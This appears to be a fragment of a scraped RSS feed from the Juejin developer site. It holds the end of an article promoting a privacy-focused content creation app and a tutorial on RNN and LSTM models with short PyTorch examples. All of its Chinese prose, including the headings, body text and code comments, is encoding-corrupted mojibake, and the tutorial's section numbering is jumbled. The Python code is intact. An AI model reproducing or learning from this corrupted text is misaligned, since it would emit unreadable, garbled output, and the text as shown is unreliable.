<li><strong>ç¼–è¾‘</strong>ï¼šæ™šä¸Šå›åˆ°å®¶ï¼Œä½ åœ¨ Mac ä¸Šæ‰“å¼€ Appï¼Œå¯¹é•¿æ–‡è¿›è¡Œæ¶¦è‰²ï¼Œå¹¶æ ¹æ®é…å›¾å»ºè®®æ‹æ‘„äº†ç…§ç‰‡ã€‚</li>
<li><strong>ä¸€é”®å¯¼å‡º</strong>ï¼š
<ul>
<li>é€‰æ‹©â€œå°çº¢ä¹¦æ¨¡å¼â€ï¼ŒApp è‡ªåŠ¨å°†ä½ çš„9å¼ ç…§ç‰‡ï¼ˆå«å°é¢ï¼‰æ‹¼æ¥æˆæ ‡å‡†çš„ä¹å®«æ ¼ï¼Œå¹¶é™„ä¸Šä¼˜åŒ–åçš„æ–‡æ¡ˆå’Œçƒ­é—¨æ ‡ç­¾ï¼Œç›´æ¥ä¿å­˜åˆ°ç›¸å†Œã€‚</li>
<li>é€‰æ‹©â€œå…¬ä¼—å·æ¨¡å¼â€ï¼ŒApp å°†é•¿æ–‡å’Œå›¾ç‰‡å¯¼å‡ºä¸ºæ ‡å‡†çš„ Markdown æ–‡ä»¶ï¼Œä½ å¯ä»¥ç›´æ¥å°†å…¶ç²˜è´´åˆ°ç§€ç±³ã€135ç¼–è¾‘å™¨ç­‰å·¥å…·ä¸­ï¼Œä¿ç•™æ‰€æœ‰æ ¼å¼ã€‚</li>
</ul>
</li>
</ol>
<p>æ•´ä¸ªè¿‡ç¨‹ï¼Œä»çµæ„Ÿåˆ°å‘å¸ƒï¼Œè¡Œäº‘æµæ°´ï¼Œæ¯«æ— å‰²è£‚æ„Ÿã€‚</p>
<h3 data-id="heading-8">äº”ã€éšç§è®¾è®¡å“²å­¦ï¼šä¸ºä½•åšæŒæœ¬åœ°ä¼˜å…ˆ</h3>
<p>åœ¨æ•°æ®æ³„éœ²äº‹ä»¶é¢‘å‘çš„ä»Šå¤©ï¼Œ<strong>éšç§æ˜¯æ•ˆç‡å·¥å…·çš„ç”Ÿå‘½çº¿</strong>ã€‚æˆ‘ä»¬çš„â€œå†…å®¹æ“ä½œç³»ç»Ÿâ€ä¸¥æ ¼éµå¾ªä»¥ä¸‹åŸåˆ™ï¼š</p>
<ul>
<li><strong>æ‰€æœ‰è‰ç¨¿ã€ç¬”è®°ã€å›¾ç‰‡å…ƒæ•°æ®å‡å­˜å‚¨äºè®¾å¤‡æœ¬åœ°</strong>ï¼Œä½¿ç”¨ Core Data çš„ SQLite å­˜å‚¨ï¼Œå®‰å…¨å¯é ã€‚</li>
<li><strong>AI è¯·æ±‚å¯é€‰è„±æ•</strong>ï¼šåœ¨å‘é€è¯·æ±‚å‰ï¼Œç”¨æˆ·å¯ä»¥é€‰æ‹©æ˜¯å¦ç§»é™¤ä¸ªäººèº«ä»½ä¿¡æ¯ã€‚</li>
<li><strong>ç»ä¸ä¸Šä¼ åŸå§‹å†…å®¹</strong>ï¼šå³ä½¿è°ƒç”¨äº‘ç«¯ AIï¼Œä¼ è¾“çš„ä¹Ÿåªæ˜¯ä¸´æ—¶çš„ã€ç»è¿‡å¤„ç†çš„è¯·æ±‚æ•°æ®ï¼ŒæœåŠ¡å™¨ä¸ä¼šç•™å­˜ä½ çš„ä»»ä½•åˆ›ä½œå†…å®¹ã€‚</li>
</ul>
<p>è¿™ç§â€œæœ¬åœ°ä¼˜å…ˆâ€çš„è®¾è®¡ï¼Œä¸ä»…ä¿æŠ¤äº†ç”¨æˆ·çš„éšç§ï¼Œä¹Ÿç¡®ä¿äº†åœ¨ç½‘ç»œä¸ä½³çš„ç¯å¢ƒä¸‹ï¼Œæ ¸å¿ƒçš„ç¼–è¾‘å’Œç®¡ç†åŠŸèƒ½ä¾ç„¶å¯ç”¨ã€‚</p>
<h3 data-id="heading-9">å…­ã€å¼€å‘è€…å¯ç¤ºï¼šå¦‚ä½•ç”¨ Apple ç”Ÿæ€æ‰“é€ å‚ç›´å·¥å…·</h3>
<p>å¯¹äºå·¥å…·ç±»åº”ç”¨å¼€å‘è€…è€Œè¨€ï¼Œè¿™ä¸ªæ¡ˆä¾‹æä¾›äº†å‡ ç‚¹é‡è¦å¯ç¤ºï¼š</p>
<ul>
<li><strong>æ·±æŒ–å‚ç›´åœºæ™¯</strong>ï¼šä¸è¦è¯•å›¾åšâ€œå…¨èƒ½â€ï¼Œè€Œæ˜¯èšç„¦äºä¸€ä¸ªå…·ä½“ã€é«˜é¢‘ã€ç—›è‹¦çš„åœºæ™¯ï¼ˆå¦‚è·¨å¹³å°å†…å®¹åˆ†å‘ï¼‰ã€‚</li>
<li><strong>å–„ç”¨ Apple åŸç”ŸæŠ€æœ¯æ ˆ</strong>ï¼šSwiftUI + Core Data + CloudKitï¼ˆå¯é€‰åŒæ­¥ï¼‰æ„æˆäº†ä¸€ä¸ªå¼ºå¤§è€Œé«˜æ•ˆçš„ç»„åˆï¼Œèƒ½æå¤§é™ä½è·¨å¹³å°å¼€å‘æˆæœ¬ã€‚</li>
<li><strong>AI æ˜¯å¢å¼ºï¼Œä¸æ˜¯æ›¿ä»£</strong>ï¼šå°† AI å®šä½ä¸ºâ€œæ™ºèƒ½è¾…åŠ©â€ï¼Œè€Œéâ€œå…¨è‡ªåŠ¨â€ï¼Œèƒ½æ›´å¥½åœ°èµ¢å¾—ä¸“ä¸šç”¨æˆ·çš„ä¿¡ä»»ã€‚</li>
<li><strong>éšç§å³å–ç‚¹</strong>ï¼šåœ¨è¥é”€ä¸­æ˜ç¡®å¼ºè°ƒâ€œæœ¬åœ°å¤„ç†â€ã€â€œæ•°æ®ä¸å‡ºè®¾å¤‡â€ï¼Œå°†æˆä¸ºåŒºåˆ«äºç«å“çš„æ ¸å¿ƒä¼˜åŠ¿ã€‚</li>
</ul>
<h3 data-id="heading-10">ç»“è¯­ï¼šå·¥å…·å³ç”Ÿäº§åŠ›</h3>
<p>æœªæ¥çš„ç«äº‰ï¼Œä¸å†æ˜¯å•æ‰“ç‹¬æ–—çš„å†…å®¹æ¯”æ‹¼ï¼Œè€Œæ˜¯<strong>åˆ›ä½œç³»ç»Ÿæ•ˆç‡çš„å¯¹å†³</strong>ã€‚ä¸€ä¸ªèƒ½å¸®ä½ å°†åˆ›æ„é«˜æ•ˆè½¬åŒ–ä¸ºå¤šå¹³å°å†…å®¹çš„â€œæ“ä½œç³»ç»Ÿâ€ï¼Œå°†æˆä¸ºæ¯ä½ä¸“ä¸šåˆ›ä½œè€…çš„å¿…å¤‡æ­¦å™¨ã€‚å®ƒè§£æ”¾çš„ä¸ä»…æ˜¯ä½ çš„æ—¶é—´ï¼Œæ›´æ˜¯ä½ çš„åˆ›é€ åŠ›ï¼Œè®©ä½ èƒ½å°†å…¨éƒ¨ç²¾åŠ›æŠ•å…¥åˆ°çœŸæ­£æœ‰ä»·å€¼çš„å†…å®¹æœ¬èº«ã€‚</p>
<p>ç°åœ¨ï¼Œæ˜¯æ—¶å€™ä¸ºè‡ªå·±æ‰“é€ è¿™æ ·ä¸€ä¸ªâ€œå†…å®¹æ“ä½œç³»ç»Ÿâ€äº†ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è¯¦è§£ RNN å¾ªç¯æœºåˆ¶ï¼šçŸ­åºåˆ—ä¼˜åŠ¿ã€é•¿ä¾èµ–é—®é¢˜åŠ LSTM è§£å†³æ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7597742970281230388</link>    <guid>https://juejin.cn/post/7597742970281230388</guid>    <pubDate>2026-01-22T06:33:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597742970281230388" data-draft-id="7597722671084421154" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è¯¦è§£ RNN å¾ªç¯æœºåˆ¶ï¼šçŸ­åºåˆ—ä¼˜åŠ¿ã€é•¿ä¾èµ–é—®é¢˜åŠ LSTM è§£å†³æ–¹æ¡ˆ"/> <meta itemprop="keywords" content="Python,PyTorch"/> <meta itemprop="datePublished" content="2026-01-22T06:33:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çˆ±å¼€å‘çš„çJAY"/> <meta itemprop="url" content="https://juejin.cn/user/2174176271278988"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è¯¦è§£ RNN å¾ªç¯æœºåˆ¶ï¼šçŸ­åºåˆ—ä¼˜åŠ¿ã€é•¿ä¾èµ–é—®é¢˜åŠ LSTM è§£å†³æ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2174176271278988/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çˆ±å¼€å‘çš„çJAY
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T06:33:05.000Z" title="Thu Jan 22 2026 06:33:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">RNN ç®€ä»‹</h2>
<p>RNNï¼ˆRecurrent Neural Networkï¼Œå¾ªç¯ç¥ç»ç½‘ç»œï¼‰ä¸€èˆ¬ä»¥åºåˆ—æ•°æ®ä¸ºè¾“å…¥ï¼Œé€šè¿‡ç½‘ç»œå†…éƒ¨çš„ç»“æ„è®¾è®¡æœ‰æ•ˆæ•æ‰åºåˆ—ä¹‹é—´çš„å…³ç³»ç‰¹å¾ï¼Œä¸€èˆ¬ä¹Ÿä»¥åºåˆ—å½¢å¼è¾“å‡ºã€‚</p>
<p>RNN çš„å¾ªç¯æœºåˆ¶ä½¿æ¨¡å‹éšå±‚ä¸Šä¸€æ—¶é—´æ­¥äº§ç”Ÿçš„ç»“æœï¼Œèƒ½å¤Ÿä½œä¸ºå½“ä¸‹æ—¶é—´æ­¥è¾“å…¥çš„ä¸€éƒ¨åˆ†ï¼ˆå½“ä¸‹æ—¶é—´æ­¥çš„è¾“å…¥é™¤äº†æ­£å¸¸çš„è¾“å…¥å¤–è¿˜åŒ…æ‹¬ä¸Šä¸€æ­¥çš„éšå±‚è¾“å‡ºï¼‰å¯¹å½“ä¸‹æ—¶é—´æ­¥çš„è¾“å‡ºäº§ç”Ÿå½±å“ã€‚</p>
<ul>
<li>ç»“æ„ï¼šä¸‰å±‚ï¼ˆè¾“å…¥å±‚ã€éšè—å±‚ã€è¾“å‡ºå±‚ï¼›å¾ªç¯å‘ç”Ÿåœ¨éšè—å±‚ï¼‰</li>
<li><img src="image.png" alt="" loading="lazy"/></li>
</ul>
<h3 data-id="heading-1">1.1 RNN æ¨¡å‹çš„ä½œç”¨</h3>
<p>å› ä¸º RNN ç»“æ„èƒ½å¤Ÿå¾ˆå¥½åˆ©ç”¨åºåˆ—ä¹‹é—´çš„å…³ç³»ï¼Œå› æ­¤é’ˆå¯¹è‡ªç„¶ç•Œå…·æœ‰è¿ç»­æ€§çš„è¾“å…¥åºåˆ—ï¼Œå¦‚äººç±»çš„è¯­è¨€ã€è¯­éŸ³ç­‰è¿›è¡Œå¾ˆå¥½å¤„ç†ï¼Œå¹¿æ³›åº”ç”¨äº NLPï¼ˆè‡ªç„¶è¯­è¨€å¤„ç†ï¼‰é¢†åŸŸçš„å„é¡¹ä»»åŠ¡ï¼Œå¦‚æ–‡æœ¬åˆ†ç±»ã€æƒ…æ„Ÿåˆ†æã€æ„å›¾è¯†åˆ«ã€æœºå™¨ç¿»è¯‘ç­‰ã€‚</p>
<p>è¯­è¨€å¤„ç†ç¤ºä¾‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/39507c18081a4539ad75e9b331624e23~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5byA5Y-R55qE54-NSkFZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769668385&amp;x-signature=hodSIH9rAp1TD%2FvmU1zeCNLOYuk%3D" alt="image2.png" loading="lazy"/></p>
<h4 data-id="heading-2">2.1 PyTorch ä¸­ä¼ ç»Ÿ RNN çš„ä½¿ç”¨</h4>
<p>ä½ç½®ï¼šåœ¨ <code>torch.nn</code> ä¸­ï¼Œé€šè¿‡ <code>torch.nn.RNN</code> å¯è°ƒç”¨ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> torch
<span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn

rnn = nn.RNN(<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>)  <span class="hljs-comment"># å®ä¾‹åŒ– rnn å¯¹è±¡</span>
<span class="hljs-comment"># å‚æ•°1ï¼šè¾“å…¥å¼ é‡ x çš„ç»´åº¦ - input_size</span>
<span class="hljs-comment"># å‚æ•°2ï¼šéšè—å±‚çš„ç»´åº¦ï¼ˆéšè—å±‚ç¥ç»å…ƒä¸ªæ•°ï¼‰- hidden_size</span>
<span class="hljs-comment"># å‚æ•°3ï¼šéšè—å±‚çš„å±‚æ•° - num_layers</span>

<span class="hljs-comment"># torch.randn - éšæœºäº§ç”Ÿæ­£æ€åˆ†å¸ƒçš„éšæœºæ•°</span>
input1 = torch.randn(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>)  <span class="hljs-comment"># è®¾å®šè¾“å…¥å¼ é‡ x - åºåˆ—é•¿ 1ï¼Œæ‰¹æ¬¡ 3ï¼Œç»´åº¦ 5</span>
<span class="hljs-comment"># å‚æ•°1ï¼šè¾“å…¥åºåˆ—é•¿åº¦ - sequence_length</span>
<span class="hljs-comment"># å‚æ•°2ï¼šæ‰¹æ¬¡çš„æ ·æœ¬ - batch_sizeï¼ˆè¡¨ç¤ºï¼š3 ä¸ªæ ·æœ¬ï¼‰</span>
<span class="hljs-comment"># å‚æ•°3ï¼šè¾“å…¥å¼ é‡ x çš„ç»´åº¦ - input_size</span>

h0 = torch.randn(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>)  <span class="hljs-comment"># è®¾å®šåˆå§‹åŒ–çš„ h0</span>
<span class="hljs-comment"># ç¬¬ä¸€ä¸ªå‚æ•°ï¼šnum_layers * num_directionsï¼ˆå±‚æ•° * ç½‘ç»œæ–¹å‘æ•°ï¼ˆ1 æˆ– 2ï¼‰ï¼‰</span>
<span class="hljs-comment"># ç¬¬äºŒä¸ªå‚æ•°ï¼šbatch_sizeï¼ˆæ‰¹æ¬¡çš„æ ·æœ¬æ•°ï¼‰</span>
<span class="hljs-comment"># ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šhidden_sizeï¼ˆéšè—å±‚çš„ç»´åº¦ï¼‰</span>

output, hn = rnn(input1, h0)
<span class="hljs-comment"># æœ€åè¾“å‡ºå’Œæœ€åä¸€å±‚çš„éšè—å±‚è¾“å‡º</span>

<span class="hljs-built_in">print</span>(output)
<span class="hljs-built_in">print</span>(output.shape)
<span class="hljs-built_in">print</span>(hn)
<span class="hljs-built_in">print</span>(hn.shape)
</code></pre>
<h4 data-id="heading-3">1.2 RNNçš„å±€é™ï¼šé•¿æœŸä¾èµ–ï¼ˆLong-TermDependenciesï¼‰é—®é¢˜</h4>
<p>RNNçš„å…³é”®ç‚¹ä¹‹ä¸€å°±æ˜¯ä»–ä»¬å¯ä»¥ç”¨æ¥è¿æ¥å…ˆå‰çš„ä¿¡æ¯åˆ°å½“å‰çš„ä»»åŠ¡ä¸Šï¼Œä¾‹å¦‚ä½¿ç”¨è¿‡å»çš„è§†é¢‘æ®µæ¥æ¨æµ‹å¯¹å½“å‰æ®µçš„ç†è§£ã€‚å¦‚æœRNNå¯ä»¥åšåˆ°è¿™ä¸ªï¼Œä»–ä»¬å°±å˜å¾—éå¸¸æœ‰ç”¨ã€‚ä½†æ˜¯çœŸçš„å¯ä»¥ä¹ˆï¼Ÿç­”æ¡ˆæ˜¯ï¼Œè¿˜æœ‰å¾ˆå¤šä¾èµ–å› ç´ ã€‚</p>
<p>æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬ä»…ä»…éœ€è¦çŸ¥é“å…ˆå‰çš„ä¿¡æ¯æ¥æ‰§è¡Œå½“å‰çš„ä»»åŠ¡ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªè¯­è¨€æ¨¡å‹ç”¨æ¥åŸºäºå…ˆå‰çš„è¯æ¥é¢„æµ‹ä¸‹ä¸€ä¸ªè¯ã€‚å¦‚æœæˆ‘ä»¬è¯•ç€é¢„æµ‹è¿™å¥è¯ä¸­â€œthe clouds are in the skyâ€æœ€åçš„è¿™ä¸ªè¯â€œskyâ€ï¼Œæˆ‘ä»¬å¹¶ä¸å†éœ€è¦å…¶ä»–çš„ä¿¡æ¯ï¼Œå› ä¸ºå¾ˆæ˜¾ç„¶ä¸‹ä¸€ä¸ªè¯åº”è¯¥æ˜¯skyã€‚åœ¨è¿™æ ·çš„åœºæ™¯ä¸­ï¼Œç›¸å…³çš„ä¿¡æ¯å’Œé¢„æµ‹çš„è¯ä½ç½®ä¹‹é—´çš„é—´éš”æ˜¯éå¸¸å°çš„ï¼ŒRNNå¯ä»¥å­¦ä¼šä½¿ç”¨å…ˆå‰çš„ä¿¡æ¯ã€‚</p>
<h4 data-id="heading-4">1.2 ä¼ ç»Ÿ RNN ä¼˜ç¼ºç‚¹</h4>
<ul>
<li>ä¼˜åŠ¿ï¼šå†…éƒ¨ç»“æ„ç®€å•ï¼Œå¯¹è®¡ç®—èµ„æºè¦æ±‚ä½ï¼›ç›¸è¾ƒ LSTM/GRU å‚æ•°æ€»é‡æ›´å°‘ï¼›åœ¨çŸ­åºåˆ—ä»»åŠ¡ä¸Šæ€§èƒ½ä¸æ•ˆæœè¡¨ç°ä¼˜å¼‚ã€‚</li>
<li>ç¼ºç‚¹ï¼šåœ¨é•¿åºåˆ—å…³è”ä¸Šè¡¨ç°è¾ƒå·®ï¼›åå‘ä¼ æ’­æ—¶æ˜“å‘ç”Ÿæ¢¯åº¦æ¶ˆå¤±æˆ–çˆ†ç‚¸ã€‚</li>
</ul>
<p>NaN å€¼ï¼ˆNot a Numberï¼Œéæ•°ï¼‰ï¼šæ˜¯è®¡ç®—æœºç§‘å­¦ä¸­æ•°å€¼æ•°æ®ç±»å‹çš„ä¸€ç±»å€¼ï¼Œè¡¨ç¤ºæœªå®šä¹‰æˆ–ä¸å¯è¡¨ç¤ºçš„å€¼ã€‚</p>
<h3 data-id="heading-5">2.1 LSTM æ¨¡å‹ç®€ä»‹</h3>
<p>Long ShortTerm ç½‘ç»œâ€”â€”ä¸€èˆ¬å°±å«åšLSTMâ€”â€”æ˜¯ä¸€ç§RNNç‰¹æ®Šçš„ç±»å‹ï¼Œå¯ä»¥å­¦ä¹ é•¿æœŸä¾èµ–ä¿¡æ¯ã€‚å½“ç„¶ï¼ŒLSTMå’ŒåŸºçº¿RNNå¹¶æ²¡æœ‰ç‰¹åˆ«å¤§çš„ç»“æ„ä¸åŒï¼Œä½†æ˜¯å®ƒä»¬ç”¨äº†ä¸åŒçš„å‡½æ•°æ¥è®¡ç®—éšçŠ¶æ€ã€‚</p>
<p>LSTMçš„â€œè®°å¿†â€æˆ‘ä»¬å«åšç»†èƒ/cellsï¼Œä½ å¯ä»¥ç›´æ¥æŠŠå®ƒä»¬æƒ³åšé»‘ç›’ï¼Œè¿™ä¸ªé»‘ç›’çš„è¾“å…¥ä¸ºå‰çŠ¶æ€å’Œå½“å‰è¾“å…¥ã€‚è¿™äº›â€œç»†èƒâ€ä¼šå†³å®šå“ªäº›ä¹‹å‰çš„ä¿¡æ¯å’ŒçŠ¶æ€éœ€è¦ä¿ç•™/è®°ä½ï¼Œè€Œå“ªäº›è¦è¢«æŠ¹å»ã€‚å®é™…çš„åº”ç”¨ä¸­å‘ç°ï¼Œè¿™ç§æ–¹å¼å¯ä»¥æœ‰æ•ˆåœ°ä¿å­˜å¾ˆé•¿æ—¶é—´ä¹‹å‰çš„å…³è”ä¿¡æ¯ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23e20a3d151d4fe09e039cbacc4f96e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54ix5byA5Y-R55qE54-NSkFZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769668385&amp;x-signature=t0ICovyNbhhQbocK7DJxP9s9mv0%3D" alt="image3.png" loading="lazy"/></p>
<h4 data-id="heading-6">2.2 PyTorch ä¸­ LSTM çš„ä½¿ç”¨</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> torch
<span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn

lstm = nn.LSTM(<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>)  <span class="hljs-comment"># å®ä¾‹åŒ– lstm å¯¹è±¡</span>
<span class="hljs-comment"># å‚æ•°1ï¼šè¾“å…¥å¼ é‡ x çš„ç»´åº¦ - input_size</span>
<span class="hljs-comment"># å‚æ•°2ï¼šéšè—å±‚çš„ç»´åº¦ï¼ˆéšè—å±‚ç¥ç»å…ƒä¸ªæ•°ï¼‰- hidden_size</span>
<span class="hljs-comment"># å‚æ•°3ï¼šéšè—å±‚çš„å±‚æ•° - num_layers</span>

input1 = torch.randn(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>)  <span class="hljs-comment"># è®¾å®šè¾“å…¥å¼ é‡ x - åºåˆ—é•¿ 1ï¼Œæ‰¹æ¬¡ 3ï¼Œç»´åº¦ 5</span>
<span class="hljs-comment"># å‚æ•°1ï¼šè¾“å…¥åºåˆ—é•¿åº¦ - sequence_length</span>
<span class="hljs-comment"># å‚æ•°2ï¼šæ‰¹æ¬¡çš„æ ·æœ¬ - batch_size</span>
<span class="hljs-comment"># å‚æ•°3ï¼šè¾“å…¥å¼ é‡ x çš„ç»´åº¦ - input_size</span>

h0 = torch.randn(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>)  <span class="hljs-comment"># è®¾å®šåˆå§‹åŒ–çš„ h0ï¼ˆéšè—å±‚ï¼‰</span>
c0 = torch.randn(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>)  <span class="hljs-comment"># è®¾å®šåˆå§‹åŒ–çš„ c0ï¼ˆç»†èƒçŠ¶æ€ï¼‰</span>
<span class="hljs-comment"># ç¬¬ä¸€ä¸ªå‚æ•°ï¼šnum_layers * num_directionsï¼ˆå±‚æ•° * ç½‘ç»œæ–¹å‘æ•°ï¼ˆ1 æˆ– 2ï¼‰ï¼‰</span>
<span class="hljs-comment"># ç¬¬äºŒä¸ªå‚æ•°ï¼šbatch_sizeï¼ˆæ‰¹æ¬¡çš„æ ·æœ¬æ•°ï¼‰</span>
<span class="hljs-comment"># ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šhidden_sizeï¼ˆéšè—å±‚çš„ç»´åº¦ï¼‰</span>

output, (hn, cn) = lstm(input1, (h0, c0))
<span class="hljs-comment"># æœ€åè¾“å‡ºå’Œæœ€åä¸€å±‚çš„éšè—å±‚è¾“å‡º</span>

<span class="hljs-built_in">print</span>(output)
<span class="hljs-built_in">print</span>(output.shape)
<span class="hljs-built_in">print</span>(hn)
<span class="hljs-built_in">print</span>(hn.shape)
<span class="hljs-built_in">print</span>(cn)
<span class="hljs-built_in">print</span>(cn.shape)
